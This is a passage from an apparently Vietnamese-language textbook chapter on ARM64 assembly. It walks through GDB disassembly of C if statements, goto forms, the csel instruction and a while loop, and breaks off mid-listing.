    smallest = y; // then statement
    goto done;

else_statement:
    smallest = x; // else statement

done:
    return smallest;
}
</code></pre>
<p><strong>Bảng 5.</strong> So sánh một hàm C và dạng <code>goto</code> tương ứng.</p>
<p>Dạng <code>goto</code> của hàm này có thể trông hơi phản trực giác, nhưng hãy phân tích xem thực chất chuyện gì đang diễn ra.<br />
Câu lệnh điều kiện kiểm tra xem biến <code>x</code> có nhỏ hơn hoặc bằng <code>y</code> hay không.</p>
<ul>
<li>
<p>Nếu <code>x</code> nhỏ hơn hoặc bằng <code>y</code>, chương trình sẽ chuyển quyền điều khiển tới nhãn <code>else_statement</code>, nơi chứa duy nhất câu lệnh <code>smallest = x</code>. Vì chương trình thực thi tuần tự, nó sẽ tiếp tục chạy phần code dưới nhãn <code>done</code>, trả về giá trị của <code>smallest</code> (<code>x</code>).</p>
</li>
<li>
<p>Nếu <code>x</code> lớn hơn <code>y</code>, thì <code>smallest</code> được gán bằng <code>y</code>. Sau đó chương trình thực thi câu lệnh <code>goto done</code>, chuyển quyền điều khiển tới nhãn <code>done</code>, trả về giá trị của <code>smallest</code> (<code>y</code>).</p>
</li>
</ul>
<p>Mặc dù câu lệnh <code>goto</code> từng được sử dụng phổ biến trong những ngày đầu của lập trình, nhưng trong code hiện đại, việc dùng <code>goto</code> được xem là một <strong>thói quen xấu</strong>, vì nó làm giảm khả năng đọc hiểu của mã nguồn.<br />
Thực tế, nhà khoa học máy tính <strong>Edsger Dijkstra</strong> đã viết một bài báo nổi tiếng chỉ trích việc sử dụng <code>goto</code> với tiêu đề <em>Go To Statement Considered Harmful</em><sup class="footnote-reference"><a href="#1">1</a></sup>.</p>
<p>Nhìn chung, các chương trình C được thiết kế tốt sẽ <strong>không</strong> sử dụng <code>goto</code>, và lập trình viên được khuyến cáo tránh dùng nó để không tạo ra code khó đọc, khó gỡ lỗi và khó bảo trì.<br />
Tuy nhiên, việc hiểu câu lệnh <code>goto</code> trong C vẫn quan trọng, vì GCC thường chuyển đổi code C có chứa điều kiện sang dạng <code>goto</code> trước khi dịch sang assembly — bao gồm cả code có câu lệnh <code>if</code> và vòng lặp.</p>
<p>Các phần tiếp theo sẽ trình bày chi tiết hơn về cách biểu diễn câu lệnh <code>if</code> và vòng lặp trong assembly:</p>
<ul>
<li><a href="C9-ARM64/if_statements.html#_if_statements_in_assembly">If Statements</a></li>
<li>Loops</li>
</ul>
<h3 id="tài-liệu-tham-khảo-4"><a class="header" href="#tài-liệu-tham-khảo-4">Tài liệu tham khảo</a></h3>
<div class="footnote-definition" id="1"><sup class="footnote-definition-label">1</sup>
<p>Edsger Dijkstra. <em>Go To Statement Considered Harmful</em>. <em>Communications of the ACM</em> 11(3), trang 147–148, 1968.</p>
</div>
<div style="break-before: page; page-break-before: always;"></div><h3 id="942-câu-lệnh-if-trong-assembly"><a class="header" href="#942-câu-lệnh-if-trong-assembly">9.4.2. Câu lệnh if trong Assembly</a></h3>
<p>Hãy cùng xem hàm <code>getSmallest</code> dưới dạng assembly. Để tiện theo dõi, hàm được nhắc lại dưới đây:</p>
<pre><code class="language-c">int getSmallest(int x, int y) {
    int smallest;
    if ( x &gt; y ) {
        smallest = y;
    }
    else {
        smallest = x;
    }
    return smallest;
}
</code></pre>
<p>Mã assembly tương ứng được trích xuất từ GDB trông như sau:</p>
<pre><code>(gdb) disas getSmallest
Dump of assembler code for function getSmallest:
0x07f4 &lt;+0&gt;:    sub  sp, sp, #0x20
0x07f8 &lt;+4&gt;:    str  w0, [sp, #12]
0x07fc &lt;+8&gt;:    str  w1, [sp, #8]
0x0800 &lt;+12&gt;:   ldr  w1, [sp, #12]
0x0804 &lt;+16&gt;:   ldr  w0, [sp, #8]
0x0808 &lt;+20&gt;:   cmp  w1, w0
0x080c &lt;+24&gt;:   b.le 0x81c &lt;getSmallest+40&gt;
0x0810 &lt;+28&gt;:   ldr  w0, [sp, #8]
0x0814 &lt;+32&gt;:   str  w0, [sp, #28]
0x0818 &lt;+36&gt;:   b    0x824 &lt;getSmallest+48&gt;
0x081c &lt;+40&gt;:   ldr  w0, [sp, #12]
0x0820 &lt;+44&gt;:   str  w0, [sp, #28]
0x0824 &lt;+48&gt;:   ldr  w0, [sp, #28]
0x0828 &lt;+52&gt;:   add  sp, sp, #0x20
0x082c &lt;+56&gt;:   ret
</code></pre>
<p>Đây là một cách hiển thị khác của code assembly so với những gì ta đã thấy trước đây. Ở đây, ta thấy <strong>địa chỉ</strong> gắn với mỗi lệnh, nhưng không thấy <strong>byte</strong> code máy. Đoạn assembly này đã được chỉnh sửa nhẹ để đơn giản hơn. Theo quy ước, GCC đặt tham số thứ nhất và thứ hai của hàm vào các thanh ghi <code>x0</code> và <code>x1</code>. Vì các tham số của <code>getSmallest</code> có kiểu <code>int</code>, compiler sẽ đặt chúng vào <em>component register</em> tương ứng là <code>w0</code> và <code>w1</code>. Để dễ theo dõi, ta sẽ gọi các tham số này lần lượt là <code>x</code> và <code>y</code>.</p>
<p>Hãy lần theo một vài dòng đầu của đoạn assembly trên. Lưu ý rằng trong ví dụ này, chúng ta sẽ <strong>không</strong> vẽ stack ra minh họa. Đây là một bài tập để bạn tự thực hành kỹ năng theo dõi stack bằng cách tự vẽ.</p>
<ul>
<li>Lệnh <code>sub</code> mở rộng call stack thêm 32 byte (<code>0x20</code>).</li>
<li>Các lệnh <code>str</code> tại <code>&lt;getSmallest+4&gt;</code> và <code>&lt;getSmallest+8&gt;</code> lưu <code>x</code> và <code>y</code> vào các vị trí <code>sp + 12</code> và <code>sp + 8</code> trên stack.</li>
<li>Các lệnh <code>ldr</code> tại <code>&lt;getSmallest+12&gt;</code> và <code>&lt;getSmallest+16&gt;</code> nạp <code>x</code> và <code>y</code> vào các thanh ghi <code>w1</code> và <code>w0</code>. Lưu ý rằng nội dung ban đầu của <code>w0</code> và <code>w1</code> đã bị hoán đổi.</li>
<li>Lệnh <code>cmp</code> so sánh <code>w1</code> với <code>w0</code> (tức so sánh <code>x</code> với <code>y</code>) và thiết lập các cờ điều kiện thích hợp.</li>
<li>Lệnh <code>b.le</code> tại <code>&lt;getSmallest+24&gt;</code> cho biết nếu <code>x &lt;= y</code> thì lệnh tiếp theo sẽ thực thi ở <code>&lt;getSmallest+40&gt;</code> (<code>pc = 0x81c</code>). Ngược lại, <code>pc</code> sẽ trỏ tới lệnh kế tiếp trong tuần tự, tức <code>0x810</code>.</li>
</ul>
<p>Các lệnh tiếp theo sẽ phụ thuộc vào việc chương trình <strong>có</strong> thực hiện nhánh tại <code>&lt;getSmallest+24&gt;</code> hay không.</p>
<p><strong>Trường hợp 1:</strong> Nhánh <strong>không</strong> được thực hiện. Khi đó, <code>pc = 0x810</code> (<code>&lt;getSmallest+28&gt;</code>), và các lệnh sau sẽ chạy:</p>
<ul>
<li><code>ldr</code> tại <code>&lt;getSmallest+28&gt;</code> nạp <code>y</code> vào <code>w0</code>.</li>
<li><code>str</code> tại <code>&lt;getSmallest+32&gt;</code> lưu <code>y</code> vào <code>sp + 28</code>.</li>
<li><code>b</code> tại <code>&lt;getSmallest+36&gt;</code> đặt <code>pc = 0x824</code>.</li>
<li><code>ldr</code> tại <code>&lt;getSmallest+48&gt;</code> nạp <code>y</code> vào <code>w0</code>.</li>
<li>Hai lệnh cuối thu nhỏ stack về kích thước ban đầu và trả về từ hàm. Lúc này, <code>y</code> nằm trong thanh ghi trả về <code>w0</code>, và <code>getSmallest</code> trả về <code>y</code>.</li>
</ul>
<p><strong>Trường hợp 2:</strong> Nhánh <strong>được</strong> thực hiện tại <code>&lt;getSmallest+24&gt;</code>. Khi đó, <code>pc = 0x81c</code> (<code>&lt;getSmallest+40&gt;</code>), và các lệnh sau sẽ chạy:</p>
<ul>
<li><code>ldr</code> tại <code>&lt;getSmallest+40&gt;</code> nạp <code>x</code> vào <code>w0</code>.</li>
<li><code>str</code> tại <code>&lt;getSmallest+44&gt;</code> lưu <code>x</code> vào <code>sp + 28</code>.</li>
<li><code>ldr</code> tại <code>&lt;getSmallest+48&gt;</code> nạp <code>x</code> vào <code>w0</code>.</li>
<li>Hai lệnh cuối thu nhỏ stack về kích thước ban đầu và trả về từ hàm. Lúc này, <code>x</code> nằm trong thanh ghi trả về <code>w0</code>, và <code>getSmallest</code> trả về <code>x</code>.</li>
</ul>
<p>Ta có thể chú thích đoạn assembly trên như sau:</p>
<pre><code>0x07f4 &lt;+0&gt;:   sub  sp, sp, #0x20          // mở rộng stack thêm 32 byte
0x07f8 &lt;+4&gt;:   str  w0, [sp, #12]          // lưu x tại sp+12
0x07fc &lt;+8&gt;:   str  w1, [sp, #8]           // lưu y tại sp+8
0x0800 &lt;+12&gt;:  ldr  w1, [sp, #12]          // w1 = x
0x0804 &lt;+16&gt;:  ldr  w0, [sp, #8]           // w0 = y
0x0808 &lt;+20&gt;:  cmp  w1, w0                 // so sánh x và y
0x080c &lt;+24&gt;:  b.le 0x81c &lt;getSmallest+40&gt; // nếu (x &lt;= y) thì nhảy tới &lt;getSmallest+40&gt;
0x0810 &lt;+28&gt;:  ldr  w0, [sp, #8]           // w0 = y
0x0814 &lt;+32&gt;:  str  w0, [sp, #28]          // lưu y tại sp+28 (smallest)
0x0818 &lt;+36&gt;:  b    0x824 &lt;getSmallest+48&gt; // nhảy tới &lt;getSmallest+48&gt;
0x081c &lt;+40&gt;:  ldr  w0, [sp, #12]          // w0 = x
0x0820 &lt;+44&gt;:  str  w0, [sp, #28]          // lưu x tại sp+28 (smallest)
0x0824 &lt;+48&gt;:  ldr  w0, [sp, #28]          // w0 = smallest
0x0828 &lt;+52&gt;:  add  sp, sp, #0x20          // thu gọn stack
0x082c &lt;+56&gt;:  ret                         // trả về smallest
</code></pre>
<p>Chuyển ngược đoạn assembly này về code C thu được:</p>
<h4 id="dạng-goto-của-getsmallest"><a class="header" href="#dạng-goto-của-getsmallest"><strong>Dạng goto của <code>getSmallest()</code></strong></a></h4>
<pre><code class="language-c">int getSmallest(int x, int y) {
    int smallest = y;
    if (x &lt;= y) {
        goto assign_x;
    }
    smallest = y;
    goto done;

assign_x:
    smallest = x;

done:
    return smallest;
}
</code></pre>
<h4 id="mã-c-tương-đương"><a class="header" href="#mã-c-tương-đương"><strong>Mã C tương đương</strong></a></h4>
<pre><code class="language-c">int getSmallest(int x, int y) {
    int smallest = y;
    if (x &lt;= y) {
        smallest = x;
    }
    else {
        smallest = y;
    }
    return smallest;
}
</code></pre>
<p>Trong các ví dụ trên, biến <code>smallest</code> tương ứng với thanh ghi <code>w0</code>. Nếu <code>x</code> nhỏ hơn hoặc bằng <code>y</code>, code sẽ thực thi câu lệnh <code>smallest = x</code>, câu lệnh này gắn với nhãn <code>goto</code> là <code>assign_x</code> trong dạng goto của hàm. Ngược lại, câu lệnh <code>smallest = y</code> sẽ được thực thi. Nhãn <code>goto</code> <code>done</code> được dùng để chỉ ra rằng giá trị trong <code>smallest</code> sẽ được trả về.</p>
<p>Lưu ý rằng bản dịch C ở trên của code assembly có hơi khác so với hàm <code>getSmallest</code> gốc. Những khác biệt này không quan trọng; khi xem xét kỹ cả hai hàm, ta thấy chúng tương đương về mặt logic. Tuy nhiên, compiler trước tiên sẽ chuyển mỗi câu lệnh <code>if</code> thành một dạng <code>goto</code> tương đương, dẫn đến một phiên bản hơi khác nhưng vẫn tương đương. Các ví dụ dưới đây cho thấy dạng chuẩn của câu lệnh <code>if</code> và dạng <code>goto</code> tương đương.</p>
<h4 id="câu-lệnh-if-trong-c"><a class="header" href="#câu-lệnh-if-trong-c"><strong>Câu lệnh <code>if</code> trong C</strong></a></h4>
<pre><code class="language-c">if (condition) {
    then_statement;
}
else {
    else_statement;
}
</code></pre>
<h4 id="dạng-goto-tương-đương-của-compiler"><a class="header" href="#dạng-goto-tương-đương-của-compiler"><strong>Dạng <code>goto</code> tương đương của compiler</strong></a></h4>
<pre><code class="language-c">    if (!condition) {
        goto else;
    }
    then_statement;
    goto done;
else:
    else_statement;
done:
</code></pre>
<p><strong>Bảng 2.</strong> Dạng chuẩn của câu lệnh if và dạng goto tương đương.</p>
<p>Khi dịch code sang assembly, compiler sẽ tạo một nhánh (<em>branch</em>) khi điều kiện đúng. Điều này khác với cấu trúc của câu lệnh <code>if</code>, nơi một “jump” (nhảy) tới <code>else</code> xảy ra khi điều kiện <em>không</em> đúng. Dạng <code>goto</code> thể hiện rõ sự khác biệt logic này.</p>
<p>Xét bản dịch <code>goto</code> ban đầu của hàm <code>getSmallest</code>, ta thấy:</p>
<ul>
<li><code>x &lt;= y</code> tương ứng với <code>!(condition)</code>.</li>
<li><code>smallest = x</code> là <code>else_statement</code>.</li>
<li><code>smallest = y</code> là <code>then_statement</code>.</li>
<li>Dòng cuối của hàm là <code>return smallest</code>.</li>
</ul>
<p>Viết lại phiên bản gốc của hàm với các chú thích trên:</p>
<pre><code class="language-c">int getSmallest(int x, int y) {
    int smallest;
    if (x &gt; y) {     // !(x &lt;= y)
        smallest = y; // then_statement
    }
    else {
        smallest = x; // else_statement
    }
    return smallest;
}
</code></pre>
<p>Phiên bản này giống hệt với hàm <code>getSmallest</code> ban đầu. Hãy nhớ rằng một hàm được viết theo nhiều cách khác nhau ở mức code C vẫn có thể được dịch ra cùng một tập lệnh assembly.</p>
<h4 id="lệnh-conditional-select"><a class="header" href="#lệnh-conditional-select">Lệnh Conditional Select</a></h4>
<p>Lệnh điều kiện cuối cùng mà chúng ta tìm hiểu là <strong>conditional select</strong> (<code>csel</code>).<br />
Các lệnh <code>cmp</code>, <code>tst</code> và <code>b</code> thực hiện <strong>conditional transfer of control</strong> (chuyển điều khiển có điều kiện) trong chương trình. Nói cách khác, luồng thực thi của chương trình sẽ rẽ nhánh theo nhiều hướng. Điều này có thể gây bất lợi cho việc tối ưu hóa code, vì các lệnh nhánh thường tốn kém để thực thi do gây gián đoạn <strong>instruction pipeline</strong> (chi tiết sẽ được đề cập trong <a href="C9-ARM64/../C5-Arch/pipelining_advanced.html#_pipelining_hazards_control_hazards">mục Kiến trúc</a>).</p>
<p>Ngược lại, lệnh <code>csel</code> thực hiện <strong>conditional transfer of data</strong> (chuyển dữ liệu có điều kiện). Nói cách khác, CPU sẽ thực thi <em>cả</em> <code>then_statement</code> và <code>else_statement</code>, sau đó đặt dữ liệu vào thanh ghi thích hợp dựa trên kết quả của điều kiện.</p>
<p>Việc sử dụng <strong>biểu thức ba ngôi</strong> (<em>ternary expression</em>) trong C thường khiến compiler sinh ra lệnh <code>csel</code> thay cho các lệnh nhánh. Với câu lệnh if-then-else chuẩn, biểu thức ba ngôi có dạng:</p>
<pre><code class="language-c">result = (condition) ? then_expression : else_expression;
</code></pre>
<p>Hãy dùng dạng này để viết lại hàm <code>getSmallest</code> dưới dạng biểu thức ba ngôi. Lưu ý rằng phiên bản mới này hoạt động giống hệt hàm <code>getSmallest</code> ban đầu:</p>
<pre><code class="language-c">int getSmallest_csel(int x, int y) {
    return x &gt; y ? y : x;
}
</code></pre>
<p>Mặc dù thay đổi này có vẻ không lớn, nhưng hãy xem code assembly được tạo ra. Nhớ rằng tham số thứ nhất và thứ hai (<code>x</code> và <code>y</code>) lần lượt được lưu trong các thanh ghi <code>w0</code> và <code>w1</code>:</p>
<pre><code>(gdb) disas getSmallest_csel
Dump of assembler code for function getSmallest_csel:
0x0860 &lt;+0&gt;:  sub  sp, sp, #0x10      // mở rộng stack thêm 16 byte
0x0864 &lt;+4&gt;:  str  w0, [sp, #12]      // lưu x tại sp+12
0x0868 &lt;+8&gt;:  str  w1, [sp, #8]       // lưu y tại sp+8
0x086c &lt;+12&gt;: ldr  w0, [sp, #8]       // w0 = y
0x0870 &lt;+16&gt;: ldr  w2, [sp, #12]      // w2 = x
0x0874 &lt;+20&gt;: ldr  w1, [sp, #12]      // w1 = x
0x0878 &lt;+24&gt;: cmp  w2, w0             // so sánh x và y
0x087c &lt;+28&gt;: csel w0, w1, w0, le     // nếu (x &lt;= y) w0 = x, ngược lại w0 = y
0x0880 &lt;+32&gt;: add  sp, sp, #0x10      // khôi phục sp
0x0884 &lt;+36&gt;: ret                     // trả về (w0)
</code></pre>
<p>Mã assembly này <strong>không có lệnh nhảy</strong>. Sau khi so sánh <code>x</code> và <code>y</code>, <code>x</code> chỉ được đưa vào thanh ghi trả về <code>w0</code> nếu <code>x &lt;= y</code>.</p>
<p>Cấu trúc của lệnh <code>csel</code> là:</p>
<pre><code>csel D, R1, R2, C // nếu (C) D = R1, ngược lại D = R2
</code></pre>
<p>Trong đó:</p>
<ul>
<li><code>D</code> là thanh ghi đích.</li>
<li><code>R1</code> và <code>R2</code> là hai thanh ghi chứa các giá trị cần chọn.</li>
<li><code>C</code> là điều kiện cần đánh giá.</li>
</ul>
<p>Tương tự như lệnh nhánh, thành phần <code>C</code> trong lệnh <code>csel</code> chỉ ra điều kiện để thực hiện chọn giá trị. Các điều kiện này giống hệt như trong <a href="C9-ARM64/conditional_control_loops.html#_conditional_branch_instruction_suffixes">bảng hậu tố lệnh nhánh có điều kiện</a>.</p>
<p>Với hàm <code>getSmallest</code> gốc, <strong>bộ tối ưu hóa nội bộ</strong> của compiler (xem Chương 12) sẽ thay thế các lệnh <code>b</code> bằng một lệnh <code>csel</code> nếu bật tối ưu hóa mức 1 (<code>-O1</code>):</p>
<pre><code>// biên dịch với: gcc -O1 -o getSmallest getSmallest.c
Dump of assembler code for function getSmallest:
0x0734 &lt;+0&gt;:  cmp  w0, w1            // so sánh x và y
0x0738 &lt;+4&gt;:  csel w0, w0, w1, le    // nếu (x &lt;= y) w0 = x, ngược lại w0 = y
0x073c &lt;+8&gt;:  ret                    // trả về (w0)
</code></pre>
<p>Nói chung, compiler rất thận trọng khi tối ưu hóa lệnh nhánh thành <code>csel</code>, đặc biệt trong các trường hợp có <strong>side effect</strong> hoặc liên quan đến con trỏ. <strong>Bảng 3</strong> dưới đây cho thấy hai cách viết tương đương của một hàm <code>incrementX</code>:</p>
<h4 id="mã-c"><a class="header" href="#mã-c">Mã C</a></h4>
<pre><code class="language-c">int incrementX(int * x) {
    if (x != NULL) { // nếu x không NULL
        return (*x)++; // tăng giá trị *x
    }
    else { // nếu x là NULL
        return 1;
    }
}
</code></pre>
<h4 id="dạng-ba-ngôi-trong-c"><a class="header" href="#dạng-ba-ngôi-trong-c">Dạng ba ngôi trong C</a></h4>
<pre><code class="language-c">int incrementX2(int * x) {
    return x ? (*x)++ : 1;
}
</code></pre>
<p><strong>Bảng 3.</strong> Hai hàm cố gắng tăng giá trị của số nguyên <code>x</code>.</p>
<p>Mỗi hàm nhận một con trỏ tới số nguyên làm tham số và kiểm tra xem nó có phải <code>NULL</code> hay không. Nếu <code>x</code> không phải <code>NULL</code>, hàm sẽ tăng giá trị mà <code>x</code> trỏ tới và trả về giá trị đó. Ngược lại, hàm trả về 1.</p>
<p>Có thể bạn sẽ nghĩ rằng <code>incrementX2</code> sẽ dùng lệnh <code>csel</code> vì nó dùng biểu thức ba ngôi. Tuy nhiên, cả hai hàm đều sinh ra <strong>code assembly giống hệt nhau</strong>:</p>
<pre><code>// tham số x nằm trong thanh ghi x0
Dump of assembler code for function incrementX2:
0x0774 &lt;+0&gt;:  mov  w1, #0x1                   // w1 = 0x1
0x0778 &lt;+4&gt;:  cbz  x0, 0x788 &lt;incrementX2+20&gt; // nếu (x == 0) nhảy tới &lt;incrementX2+20&gt;
0x077c &lt;+8&gt;:  ldr  w1, [x0]                   // w1 = *x
0x0780 &lt;+12&gt;: add  w2, w1, #0x1               // w2 = w1 + 1
0x0784 &lt;+16&gt;: str  w2, [x0]                   // *x = w2
0x0788 &lt;+20&gt;: mov  w0, w1                     // w0 = *x
0x078c &lt;+24&gt;: ret                             // trả về (w0)
</code></pre>
<p>Hãy nhớ rằng lệnh <code>csel</code> <strong>thực thi cả hai nhánh</strong> của điều kiện. Nói cách khác, <code>x</code> sẽ luôn bị dereference (giải tham chiếu) dù điều kiện đúng hay sai. Nếu <code>x</code> là con trỏ null, việc dereference sẽ gây <strong>null pointer exception</strong> và dẫn đến <strong>segmentation fault</strong>. Để tránh rủi ro này, compiler chọn cách an toàn là dùng lệnh nhánh thay vì <code>csel</code>.</p>
<div style="break-before: page; page-break-before: always;"></div><h3 id="943-vòng-lặp-trong-assembly"><a class="header" href="#943-vòng-lặp-trong-assembly">9.4.3. Vòng lặp trong Assembly</a></h3>
<p>Tương tự như câu lệnh <code>if</code>, các vòng lặp trong assembly cũng được triển khai bằng <strong>branch instruction</strong> (lệnh rẽ nhánh).<br />
Tuy nhiên, vòng lặp cho phép các lệnh được <strong>thực thi lại</strong> dựa trên kết quả của một điều kiện được đánh giá.</p>
<p>Hàm <code>sumUp</code> trong ví dụ dưới đây tính tổng tất cả các số nguyên dương từ 1 đến một số nguyên <em>n</em> do người dùng nhập.<br />
Đoạn code này được viết <strong>không tối ưu</strong> để minh họa cách hoạt động của vòng lặp <code>while</code> trong C.</p>
<pre><code class="language-c">int sumUp(int n) {
    // khởi tạo total và i
    int total = 0;
    int i = 1;

    while (i &lt;= n) {  // khi i nhỏ hơn hoặc bằng n
        total += i;   // cộng i vào total
        i++;          // tăng i thêm 1
    }
    return total;
}
</code></pre>
<p>Khi biên dịch và dùng GDB để disassemble, ta thu được code assembly sau:</p>
<pre><code>Dump of assembler code for function sumUp:
0x0724 &lt;+0&gt;:   sub   sp, sp, #0x20
0x0728 &lt;+4&gt;:   str   w0, [sp, #12]
0x072c &lt;+8&gt;:   str   wzr, [sp, #24]
0x0730 &lt;+12&gt;:  mov   w0, #0x1
0x0734 &lt;+16&gt;:  str   w0, [sp, #28]
0x0738 &lt;+20&gt;:  b     0x758 &lt;sumUp+52&gt;
0x073c &lt;+24&gt;:  ldr   w1, [sp, #24]
0x0740 &lt;+28&gt;:  ldr   w0, [sp, #28]
0x0744 &lt;+32&gt;:  add   w0, w1, w0
0x0748 &lt;+36&gt;:  str   w0, [sp, #24]
0x074c &lt;+40&gt;:  ldr   w0, [sp, #28]
0x0750 &lt;+44&gt;:  add   w0, w0, #0x1
0x0754 &lt;+48&gt;:  str   w0, [sp, #28]
0x0758 &lt;+52&gt;:  ldr   w1, [sp, #28]
0x075c &lt;+56&gt;:  ldr   w0, [sp, #12]
0x0760 &lt;+60&gt;:  cmp   w1, w0
0x0764 &lt;+64&gt;:  b.le  0x73c &lt;sumUp+24&gt;
0x0768 &lt;+68&gt;:  ldr   w0, [sp, #24]
0x076c &lt;+72&gt;:  add   sp, sp, #0x20
0x0770 &lt;+76&gt;:  ret
</code></pre>
<p>Trong ví dụ này, chúng ta sẽ <strong>không</strong> vẽ sơ đồ stack chi tiết, nhưng bạn nên tự thực hành để hiểu rõ hơn.</p>
<h4 id="năm-lệnh-đầu-tiên-2"><a class="header" href="#năm-lệnh-đầu-tiên-2">Năm lệnh đầu tiên</a></h4>
<p>Năm lệnh đầu tiên của hàm này thiết lập stack để thực thi hàm và lưu trữ một số giá trị tạm thời:</p>
<pre><code>0x0724 &lt;+0&gt;:  sub  sp, sp, #0x20   // mở rộng stack thêm 32 byte (tạo stack frame mới)
0x0728 &lt;+4&gt;:  str  w0, [sp, #12]   // lưu n tại sp+12 (n)
0x072c &lt;+8&gt;:  str  wzr, [sp, #24]  // lưu 0 tại sp+24 (total)
0x0730 &lt;+12&gt;: mov  w0, #0x1        // w0 = 1
0x0734 &lt;+16&gt;: str  w0, [sp, #28]   // lưu 1 tại sp+28 (i)
</code></pre>
<p>Cụ thể, chúng thực hiện:</p>
<ul>
<li>Mở rộng call stack thêm 32 byte, đánh dấu frame mới.</li>
<li>Lưu tham số đầu tiên (<code>n</code>) tại vị trí <code>sp + 12</code>.</li>
<li>Lưu giá trị 0 tại <code>sp + 24</code> (biến <code>total</code>).</li>
<li>Gán giá trị 1 vào thanh ghi <code>w0</code>.</li>
<li>Lưu giá trị 1 tại <code>sp + 28</code> (biến <code>i</code>).</li>
</ul>
<p>Hãy nhớ rằng các vị trí trên stack lưu <strong>biến tạm thời</strong> trong hàm.<br />
Để đơn giản, ta sẽ gọi vị trí <code>sp + 24</code> là <code>total</code> và <code>sp + 28</code> là <code>i</code>.<br />
Tham số đầu vào <code>n</code> của <code>sumUp</code> nằm tại địa chỉ <code>sp + 12</code>.</p>
<p>Mặc dù các biến tạm thời được đặt trên stack, nhưng stack pointer <strong>không thay đổi</strong> sau khi thực thi lệnh đầu tiên (<code>sub sp, sp, #0x20</code>).</p>
<h4 id="trọng-tâm-của-vòng-lặp-the-heart-of-the-loop"><a class="header" href="#trọng-tâm-của-vòng-lặp-the-heart-of-the-loop">Trọng tâm của vòng lặp (The Heart of the Loop)</a></h4>
<p>12 lệnh tiếp theo trong hàm <code>sumUp</code> chính là <strong>trọng tâm</strong> của vòng lặp:</p>
<pre><code>0x0738 &lt;+20&gt;: b     0x758 &lt;sumUp+52&gt;  // nhảy tới &lt;sumUp+52&gt;
0x073c &lt;+24&gt;: ldr   w1, [sp, #24]     // w1 = total
0x0740 &lt;+28&gt;: ldr   w0, [sp, #28]     // w0 = i
0x0744 &lt;+32&gt;: add   w0, w1, w0        // w0 = i + total
0x0748 &lt;+36&gt;: str   w0, [sp, #24]     // lưu (total + i) vào total
0x074c &lt;+40&gt;: ldr   w0, [sp, #28]     // w0 = i
0x0750 &lt;+44&gt;: add   w0, w0, #0x1      // w0 = i + 1
0x0754 &lt;+48&gt;: str   w0, [sp, #28]     // lưu (i+1) vào i (i++)
0x0758 &lt;+52&gt;: ldr   w1, [sp, #28]     // w1 = i
0x075c &lt;+56&gt;: ldr   w0, [sp, #12]     // w0 = n
0x0760 &lt;+60&gt;: cmp   w1, w0            // so sánh i và n
0x0764 &lt;+64&gt;: b.le  0x73c &lt;sumUp+24&gt;  // nếu (i &lt;= n) thì nhảy tới &lt;sumUp+24&gt;
</code></pre>
<ul>
<li>Lệnh đầu tiên là một cú nhảy trực tiếp tới <code>&lt;sumUp+52&gt;</code>, đặt thanh ghi <strong>program counter</strong> (<code>pc</code>) thành địa chỉ <code>0x758</code>.</li>
<li>Hai lệnh tiếp theo (tại <code>&lt;sumUp+52&gt;</code> và <code>&lt;sumUp+56&gt;</code>) nạp <code>i</code> và <code>n</code> vào các thanh ghi <code>w1</code> và <code>w0</code>.</li>
<li>Lệnh <code>cmp</code> tại <code>&lt;sumUp+60&gt;</code> so sánh <code>i</code> và <code>n</code>, thiết lập các cờ điều kiện thích hợp. Thanh ghi <code>pc</code> sau đó trỏ tới lệnh tiếp theo (<code>0x764</code>).</li>
<li>Lệnh <code>b.le</code> tại <code>&lt;sumUp+64&gt;</code> thay giá trị của <code>pc</code> bằng <code>0x73c</code> nếu <code>i &lt;= n</code>.</li>
</ul>
<p>Nếu <strong>nhánh được thực hiện</strong> (tức <code>i &lt;= n</code>), chương trình nhảy tới <code>&lt;sumUp+24&gt;</code> và thực thi các lệnh sau:</p>
<ul>
<li><code>ldr</code> tại <code>&lt;sumUp+24&gt;</code> và <code>&lt;sumUp+28&gt;</code> nạp <code>total</code> và <code>i</code> vào <code>w1</code> và <code>w0</code>.</li>
<li><code>add</code> tại <code>&lt;sumUp+32&gt;</code> cộng <code>total</code> với <code>i</code> và lưu kết quả vào <code>w0</code>.</li>
<li><code>str</code> tại <code>&lt;sumUp+36&gt;</code> cập nhật <code>total</code> bằng giá trị trong <code>w0</code>.</li>
<li><code>ldr</code> tại <code>&lt;sumUp+40&gt;</code> nạp <code>i</code> vào <code>w0</code>.</li>
<li><code>add</code> tại <code>&lt;sumUp+44&gt;</code> cộng 1 vào <code>i</code> và lưu vào <code>w0</code>.</li>
<li><code>str</code> tại <code>&lt;sumUp+48&gt;</code> cập nhật <code>i</code> bằng giá trị trong <code>w0</code>.</li>
<li><code>ldr</code> tại <code>&lt;sumUp+52&gt;</code> và <code>&lt;sumUp+56&gt;</code> nạp <code>i</code> và <code>n</code> vào <code>w1</code> và <code>w0</code>.</li>
<li><code>cmp</code> tại <code>&lt;sumUp+60&gt;</code> so sánh <code>i</code> với <code>n</code> và thiết lập cờ điều kiện.</li>
<li><code>b.le</code> thực thi: nếu <code>i &lt;= n</code>, chương trình quay lại <code>&lt;sumUp+24&gt;</code> và lặp lại các lệnh từ <code>&lt;sumUp+24&gt;</code> đến <code>&lt;sumUp+64&gt;</code>. Nếu không, <code>pc</code> được đặt thành <code>0x768</code> (<code>&lt;sumUp+68&gt;</code>).</li>
</ul>
<p>Nếu <strong>nhánh không được thực hiện</strong> (<code>i &gt; n</code>), các lệnh sau chạy:</p>
<pre><code>0x0768 &lt;+68&gt;:  ldr   w0, [sp, #24]   // w0 = total
0x076c &lt;+72&gt;:  add   sp, sp, #0x20   // khôi phục stack
0x0770 &lt;+76&gt;:  ret                   // trả về w0 (total)
</code></pre>
<p>Các lệnh này sao chép <code>total</code> vào thanh ghi trả về <code>w0</code>, thu nhỏ stack (<code>sp</code>) để khôi phục call stack, và thoát hàm.<br />
Kết quả là hàm trả về <code>total</code>.</p>
<p><strong>Bảng 1</strong> dưới đây so sánh code assembly và dạng C sử dụng <code>goto</code> của hàm <code>sumUp</code>:</p>
<h4 id="assembly"><a class="header" href="#assembly">Assembly</a></h4>
<pre><code class="language-asm">&lt;sumUp&gt;:
  &lt;+0&gt;:   sub   sp, sp, #0x20
  &lt;+4&gt;:   str   w0, [sp, #12]
  &lt;+8&gt;:   str   wzr, [sp, #24]
  &lt;+12&gt;:  mov   w0, #0x1
  &lt;+16&gt;:  str   w0, [sp, #28]
  &lt;+20&gt;:  b     0x758 &lt;sumUp+52&gt;
  &lt;+24&gt;:  ldr   w1, [sp, #24]
  &lt;+28&gt;:  ldr   w0, [sp, #28]
  &lt;+32&gt;:  add   w0, w1, w0
  &lt;+36&gt;:  str   w0, [sp, #24]
  &lt;+40&gt;:  ldr   w0, [sp, #28]
